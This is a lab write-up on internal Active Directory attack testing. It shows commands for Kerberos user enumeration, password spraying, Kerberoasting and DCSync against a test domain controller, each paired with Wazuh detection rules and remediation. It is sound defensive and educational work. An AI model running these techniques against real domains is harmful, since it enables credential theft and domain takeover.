# Phase 8 — Internal AD Attack Verification (Part B)

Assume-breach: the attacker already has a foothold on the Users VLAN (a phished workstation). Kali was re-cabled in EVE-NG from the WAN segment to a free SW1 access port in VLAN 10, with a static address `192.168.10.50`. From here it reaches the DC on all AD ports — intentionally, because workstations must authenticate against the DC. All timestamps UTC.

> This attacker port (SW1 `e1/1`) was enabled on VLAN 10 **for the internal testing only**. The committed switch baseline keeps `e1/1` shut and in the black-hole VLAN 666; it is reverted there once internal testing is complete.

```bash
ping 192.168.100.100     # DC reachable (ttl=127 = Windows, 1 hop through R1)
nslookup cyber.local     # 192.168.100.100  — the DC is also the DNS
```

> **Time sync caveat.** Kerberos tolerates ≤ 5 minutes of clock skew. The EVE-NG virtual router (R1, the NTP master) has no hardware RTC and drifts, so the DC and Kali repeatedly fell out of sync and Kerberos attacks failed with `KRB_AP_ERR_SKEW` until re-synced. The lab was standardised on **UTC everywhere** (R1 master → DC via `w32tm /config /manualpeerlist:"192.168.100.254,0x8"` → domain members → Kali via `timesyncd`). Continuous sync, not a one-time set, is required. See the clock-skew notes in the troubleshooting log.

## 1. Recon / enumeration — almost entirely blocked

### SMB (null session)

```
nxc smb 192.168.100.100 -u '' -p '' --shares   → STATUS_ACCESS_DENIED
nxc smb 192.168.100.100 -u '' -p '' --users    → (empty)
nxc smb 192.168.100.100 -u 'guest' -p '' --rid-brute → STATUS_ACCOUNT_DISABLED
```

Banner confirms the Phase 7 hardening: `signing:True`, `SMBv1:None`. `Null Auth:True` is **not** a finding — the anonymous session connects at the protocol level (Windows default) but reads nothing, because `RestrictAnonymous` denies shares and users.

### LDAP (anonymous bind)

```
ldapsearch -x -H ldap://192.168.100.100 -b "DC=cyber,DC=local"
  → "In order to perform this operation a successful bind must be completed"
```

Anonymous LDAP read is denied.

**Result:** from a normal position the attacker confirms it is a DC in `cyber.local`, but cannot pull users, groups or shares. Good hardening forces the attacker to find a credential first.

## 2. Kerberos user enumeration — the one path that still works

SMB/LDAP are locked, but the KDC answers differently for valid vs invalid users (port 88), and this is not affected by `RestrictAnonymous`:

```bash
impacket-GetNPUsers cyber.local/ -no-pass -usersfile users.txt -dc-ip 192.168.100.100
```

Three response types, each informative:

```
administrator  "doesn't have UF_DONT_REQUIRE_PREAUTH set"  → exists, enabled, protected
danih          "doesn't have UF_DONT_REQUIRE_PREAUTH set"  → exists, enabled, protected
(×2)           KDC_ERR_CLIENT_REVOKED                       → exists but disabled/locked
(the rest)     KDC_ERR_C_PRINCIPAL_UNKNOWN                  → does not exist
```

**Two hardening wins, visible at once:**

- **0 AS-REP hashes** returned — Phase 7 removed every AS-REP-roastable account (**this closes AS-REP roasting: no attack surface**).
- The disabled guest/dormant accounts return `REVOKED`, not a hash — the Phase 7 account cleanup holds.

The attacker walks away with two valid names (`administrator`, `danih`) and nothing else.

### Detection

~25 `4768` events on the DC in seconds, one source (`::ffff:192.168.10.50`), many target names, most with status `0x6` (principal unknown). That shape — *one source, many usernames, mostly failures, in seconds* — is the enumeration signature. The built-in correlation rule **60205** *Multiple Windows audit failure events* (level 10) fired. Built-in coverage is adequate here; a custom rule would only add a MITRE label (T1087.002) and is noted, not built. Knowing what the default ruleset already covers is part of the job.

## 3. Password spray — policy held

```bash
nxc smb 192.168.100.100 -u validusers.txt -p spray_pw.txt --continue-on-success
# 2 users × 5 common passwords, well under the 15-attempt lockout threshold
```

All 10 attempts → `STATUS_LOGON_FAILURE`. No weak credential found; the password policy held.

### Detection — the spray signature

Built-in rules fired: **60122** *Logon Failure – Unknown user or bad password* (level 5), **60104** audit-failure (level 5), and the correlation **60204** *Multiple Windows Logon Failures* (level 10). The evidence an analyst builds a case from:

```
ipAddress:       ::ffff:192.168.10.50   (one source)
logonType:       3                       (network logon = remote tool, not an interactive login)
authPackage:     NTLM
targetUserName:  administrator, danih    (several accounts)
subStatus:       0xC000006A              (name correct, password wrong)
```

Triage gold — the `subStatus` code tells you whether the usernames are valid:

```
0xC0000064  username does not exist
0xC000006A  username correct, password wrong   ← attacker has valid names
0xC0000234  account locked out
0xC0000072  account disabled
```

## 4. AS-REP roasting

Covered by step 2 — `GetNPUsers` returned **0** roastable accounts. No attack surface (Phase 7). ✅

## 5. Kerberoasting — demonstrated end to end

The domain had **no** service accounts with SPNs (`GetUserSPNs` → "No entries found"), which is itself the strongest defense — you cannot roast what does not exist. To demonstrate the full technique *and* the defense, a deliberately roastable honeypot was created:

```powershell
New-ADUser -Name "svc-sql" -SamAccountName "svc-sql" -AccountPassword <20-char random> -Enabled $true
setspn -S MSSQLSvc/sql01.cyber.local:1433 svc-sql
Set-ADUser svc-sql -KerberosEncryptionType AES128,AES256     # AES only
```

Roast it as the phished user `danih`:

```bash
impacket-GetUserSPNs cyber.local/danih:<pw> -dc-ip 192.168.100.100 -request
→ $krb5tgs$18$svc-sql$CYBER.LOCAL$...
```

The `$18$` (AES256), not `$23$` (RC4), is the Phase 7 hardening showing up directly in the loot.

**Cracking defeated — three ways over:**

- `hashcat -m 19700` could not run — no GPU / OpenCL in the VM.
- `john --format=krb5tgs` → *No password hashes loaded* — this build's format is RC4-only and cannot load an AES256 TGS-REP.
- The password is 20 random characters — in no wordlist regardless of tooling.

AES-only did more than slow cracking: it **broke the standard offline-crack workflow**, which is built around RC4.

### Detection gap → honeypot rule 100500

The successful roast left four `4769` events on the DC (confirmed at source with `Get-WinEvent`):

```
Account Name:  danih@CYBER.LOCAL      Service Name:  svc-sql
Client Address: ::ffff:192.168.10.50  Ticket Encryption Type: 0x12 (AES256)  Failure Code: 0x0
```

These did **not** surface as an alert in Wazuh — a successful TGS request is indistinguishable from legitimate activity, and AES removed the classic RC4 (`0x17`) flag. The event is logged but benign-looking, so no default rule elevates it.

Fix — because `svc-sql` is a honeypot nobody should ever legitimately request, **any** `4769` for it is malicious:

```xml
<rule id="100500" level="12">
  <if_group>windows</if_group>
  <field name="win.system.eventID">^4769$</field>
  <field name="win.eventdata.serviceName">^svc-sql$</field>
  <description>Kerberoasting HONEYPOT: TGS requested for decoy account svc-sql by $(win.eventdata.targetUserName) from $(win.eventdata.ipAddress) - T1558.003</description>
  <mitre><id>T1558.003</id></mitre>
  <group>kerberoasting,honeypot,attack,</group>
</rule>
```

Re-running the roast fired **100500** (level 12), zero false positives. `svc-sql` is kept live as a standing honeypot.

## 6. DCSync — the climax

### As a normal user (`danih`) — blocked

```bash
impacket-secretsdump cyber.local/danih:<pw>@192.168.100.100 -just-dc-user krbtgt
→ DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN   (no hashes returned)
```

`danih` lacks the replication right, so the request never completes — **0 hashes**. This is the Phase 7 Domain-Admins minimisation working: an ordinary foothold cannot pull domain secrets.

### As Domain Admin (`Administrator`) — succeeds

```bash
impacket-secretsdump cyber.local/Administrator:<pw>@192.168.100.100 -just-dc-user krbtgt
→ krbtgt:502:...:59fda570...:::            (hash redacted)
→ krbtgt:aes256-cts-hmac-sha1-96:0267...
```

With the `krbtgt` hash an attacker forges Golden Tickets — total, persistent domain control. This is *why* minimising Domain Admins matters: DCSync is available to that one account and no one else. It also surfaced the worst password gap in the lab — the sole Domain Admin's password was `Pa$$word` (8 chars), since fixed.

### Detection gap → rule 100510

The successful DCSync generated `4662` on the DC with the replication GUID `1131f6aa` (DS-Replication-Get-Changes), confirmed at source. Like the Kerberoast event, it was decoded but not alerted. Legitimate replication is performed by **machine accounts** (`DC$`); a DCSync attacker uses a **user** account — so filter on that:

```xml
<rule id="100510" level="13">
  <if_group>windows</if_group>
  <field name="win.system.eventID">^4662$</field>
  <field name="win.eventdata.properties">1131f6aa</field>
  <field name="win.eventdata.subjectUserName" negate="yes">\$$</field>
  <description>DCSync attempt: directory replication (Get-Changes) by non-machine account $(win.eventdata.subjectUserName) - T1003.006</description>
  <mitre><id>T1003.006</id></mitre>
  <group>dcsync,attack,</group>
</rule>
```

Re-running the DCSync fired **100510** (level 13), two events (the two replication-GUID accesses). DCSync detection gap closed.

## Remediation applied during the phase

| Finding | Fix |
|---------|-----|
| `danih` password 11 chars (pre-policy) | reset to a long random pass-phrase |
| `Administrator` password `Pa$$word`, 8 chars (pre-policy) — the sole Domain Admin | reset to a long random pass-phrase |
| Kerberoasting not alerted | rule 100500 (honeypot `svc-sql`) |
| DCSync not alerted | rule 100510 (`4662` + replication GUID, non-machine account) |

## Outcome

The full AD kill chain — recon, user enumeration, spraying, AS-REP, Kerberoasting, DCSync — was run from an internal foothold. Every technique was **blocked or made useless by the Phase 7 hardening**, and every one is now **either detected by a built-in rule or by a custom rule written to close the gap**.

**Evidence:** [screenshots/phase8/](../screenshots/phase8/) — `partB-*`
